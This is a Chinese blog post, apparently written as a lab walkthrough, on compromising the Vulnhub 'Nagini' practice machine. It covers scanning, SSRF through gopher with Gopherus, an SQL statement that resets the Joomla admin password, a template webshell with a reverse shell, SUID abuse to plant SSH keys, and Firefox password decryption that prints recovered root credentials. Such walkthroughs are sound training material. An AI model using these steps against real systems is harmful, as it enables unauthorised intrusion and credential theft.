@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Nagini | YiFang</title><meta name="keywords" content="Vulnhub-middlum"><meta name="author" content="YiFang"><meta name="copyright" content="YiFang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Nagini打靶靶机介绍 http3 joomla漏洞 ssrf+gopher协议   攻击主机：kali Linux 2021 192.168.0.102 目标：Debian 192.168.0.101 开始打靶1.主机发现arp-scan 12345678910➜  ~ sudo arp-scan -l[sudo] password for yifang: Interface: eth0, t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nagini">
+<meta property="og:url" content="http://example.com/2022/01/20/Nagini/index/index.html">
+<meta property="og:site_name" content="YiFang">
+<meta property="og:description" content="Nagini打靶靶机介绍 http3 joomla漏洞 ssrf+gopher协议   攻击主机：kali Linux 2021 192.168.0.102 目标：Debian 192.168.0.101 开始打靶1.主机发现arp-scan 12345678910➜  ~ sudo arp-scan -l[sudo] password for yifang: Interface: eth0, t">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201828277.png">
+<meta property="article:published_time" content="2022-01-20T06:35:45.677Z">
+<meta property="article:modified_time" content="2022-01-20T10:36:55.380Z">
+<meta property="article:author" content="YiFang">
+<meta property="article:tag" content="Vulnhub-middlum">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201828277.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/01/20/Nagini/index/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Nagini',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-20 18:36:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201112100412.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201828277.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">YiFang</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Nagini</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-20T06:35:45.677Z" title="发表于 2022-01-20 14:35:45">2022-01-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-20T10:36:55.380Z" title="更新于 2022-01-20 18:36:55">2022-01-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Vulnhub/">Vulnhub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Nagini"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Nagini打靶"><a href="#Nagini打靶" class="headerlink" title="Nagini打靶"></a>Nagini打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><ol>
+<li>http3</li>
+<li>joomla漏洞</li>
+<li>ssrf+gopher协议</li>
+</ol>
+<hr>
+<p>攻击主机：<em>kali Linux 2021</em> 192.168.0.102</p>
+<p>目标：<em>Debian 192.168.0.101</em></p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>arp-scan</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.0.101	08:00:27:0e:96:f2	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.357 seconds (108.61 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sC -sV -p- 192.168.0.101</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-20 05:21 EST</span><br><span class="line">Nmap scan report for quic.nagini.hogwarts (192.168.0.101)</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)</span><br><span class="line">|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)</span><br><span class="line">|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-目录爆破"><a href="#3-目录爆破" class="headerlink" title="3.目录爆破"></a>3.目录爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dirsearch -u http://192.168.0.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e php,txt,html -f</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, txt, html | HTTP method: GET | Threads: 30 | Wordlist size: 438225</span><br><span class="line"></span><br><span class="line">Output File: /home/yifang/.dirsearch/reports/192.168.0.101/_22-01-20_05-27-08.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/yifang/.dirsearch/logs/errors-22-01-20_05-27-08.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.0.101/</span><br><span class="line"></span><br><span class="line">[05:27:08] Starting: </span><br><span class="line">[05:27:08] 200 -   97B  - /index.html</span><br><span class="line">[05:27:09] 403 -  278B  - /icons/</span><br><span class="line">[05:27:32] 200 -  234B  - /note.txt</span><br><span class="line">[05:27:51] 301 -  315B  - /joomla  -&gt;  http://192.168.0.101/joomla/</span><br><span class="line">[05:27:51] 200 -    6KB - /joomla/</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-安装http3服务"><a href="#4-安装http3服务" class="headerlink" title="4.安装http3服务"></a>4.安装http3服务</h3><p>这台靶机需要安装http3，而目前市面上的浏览器也仅仅支持http2，所以就需要寻找一个新的http3的客户端</p>
+<p>由 <code>cloudfare</code>家开发的<code>quiche</code>可以进行对<code>http3</code>服务的访问，接下来进行安装</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ git clone --recursive https://github.com/cloudflare/quiche/</span><br><span class="line">➜  ~ sudo apt install cmake</span><br><span class="line">➜  ~ sudo apt install cargo</span><br><span class="line">➜  ~ cargo build --examples 			#(会产生报错)</span><br><span class="line">➜  ~ sudo apt purge rustc				#(处理报错)</span><br><span class="line">➜  ~ curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh #选择 1 选项</span><br><span class="line">➜  ~ source $HOME/.cargo/env</span><br><span class="line">➜  ~ cargo build --examples</span><br><span class="line">➜  ~ cargo test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201548159.png"></p>
+<p>安装好的客户端在 <code>/quiche/targer/debug/examples</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ vim /etc/hosts									#(先编辑hosts文件)</span><br><span class="line">➜  ~ cd /quiche/target/debug/examples</span><br><span class="line">➜  ~ ./http3-client https://quic.nagini.hogwarts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201559395.png"></p>
+<p>成功访问，得到的信息是目标存在一个 <code>internalResourceFeTcher.php</code>文件，而经过我的测试，他存在ssrf漏洞，且可以包含本地文件</p>
+<p>第二条消息的意思是，在目标服务器中存在某个 <code>.bak</code>后缀的文件，在通过百度+爆破后得到 <code>/joomla/configuration.php.bak</code>文件</p>
+<h3 id="5-信息泄露-gopher"><a href="#5-信息泄露-gopher" class="headerlink" title="5.信息泄露+gopher"></a>5.信息泄露+gopher</h3><p>首先介绍一下 <code>gopher</code>协议，gopher的使用条件是前台存在 <code>ssrf</code>漏洞，后端满足使用 <code>tcp</code>协议即可</p>
+<p>首先对目标的<code>ssrf</code>漏洞进行测试发包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201701196.png"></p>
+<p>测试内容为 <code>gopher：//127.0.0.1：22</code>对目标的<code>22</code>进行探测，出现以上反馈时，即为存在漏洞，</p>
+<p>然后查看刚才得到的配置文件，基本可以得到服务器的内部数据库配置信息</p>
+<p>现在试想：<code>gopher</code>协议是否能针对目标服务器进行操作呢？ 答案是肯定的</p>
+<p>gopher食用指南：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p>
+<p>现在安装 <code>Gopherus</code>工具</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus.git</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>gopherus</code>生成payload，进行测试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201706090.png"></p>
+<p>将生成的数据进行插入，然后得到以下回显，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201707383.png"></p>
+<p>然后对目标进行sql 查询</p>
+<p>成功获取数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201646180.png"></p>
+<p>但是，获得的密码是加密后的文件，怎么办？</p>
+<p>直接修改密码就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use joomla; update joomla_users SET password=&#x27;e10adc3949ba59abbe56e057f20f883e&#x27; WHERE username=&#x27;site_admin&#x27;; 密文为md5(123456)</span><br></pre></td></tr></table></figure>
+
+<p>成功登录后台，<code>joomla</code>的上传webshell的思路与<code>wordpress</code>相似，可以先查看目标的模板文件，然后修改源码，上传webshell，而这里刚好可以修改 <code>protostar</code>模板的<code>error.php</code>文件</p>
+<p>然后我们监听php反弹shell<code>http://192.168.0.101/joomla/templates/protostar/error.php</code></p>
+<p>在kali中自带 <code>/usr/share/webshell</code>中有许多的webshell</p>
+<p><code>/bin/bash -i</code>反弹ptyshell</p>
+<h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6.提权"></a>6.提权</h3><p>在目标准寻找可以进行提权的文件，发先 <code>snape</code>用户家目录存在<code>.creds.txt</code>文件，然后解码获得 <code>snape</code>密码，成功登录</p>
+<p>接下来，使用<code>ssh</code>登录<code>snape</code>，然后<code>snape</code>可以访问<code>hermoine/bin</code>下的带有<code>suid</code>权限的su_cp文件，然后把snape下 <code>authorized_keys</code>文件放到hermoine的.ssh文件夹下，成功访问<code>hermoine</code>用户，然后在目录下发现浏览器的一些存储文件</p>
+<h4 id="浏览器密码恢复"><a href="#浏览器密码恢复" class="headerlink" title="浏览器密码恢复"></a>浏览器密码恢复</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ scp -rp hermoine@192.168.0.101:/home/hermoine/.mozilla /tmp</span><br></pre></td></tr></table></figure>
+
+<p>首先下载目标文件</p>
+<p>然后安装工具</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ git clonehttps://github.com/unode/firefox_decrypt.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201818382.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 firefox_decrypt.py /tmp/.mozilla/firefox</span><br><span class="line">Website:   http://nagini.hogwarts</span><br><span class="line">Username: &#x27;root&#x27;</span><br><span class="line">Password: &#x27;@Alohomora#123&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>打靶结束</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">YiFang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/20/Nagini/index/">http://example.com/2022/01/20/Nagini/index/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">YiFang</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub-middlum/">Vulnhub-middlum</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201828277.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/01/20/%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90%E6%9C%A8%E9%A9%AC/index/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201349189.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">简单溯源远控马的服务器IP地址及端口号</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/17/evilbox/index/" title="EvilBox"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122106227.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">EvilBox</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nagini%E6%89%93%E9%9D%B6"><span class="toc-number">1.</span> <span class="toc-text">Nagini打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">靶机介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%89%93%E9%9D%B6"><span class="toc-number">1.2.</span> <span class="toc-text">开始打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.目录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%AE%89%E8%A3%85http3%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.4.</span> <span class="toc-text">4.安装http3服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-gopher"><span class="toc-number">1.2.5.</span> <span class="toc-text">5.信息泄露+gopher</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.6.</span> <span class="toc-text">6.提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%81%A2%E5%A4%8D"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">浏览器密码恢复</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By YiFang</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
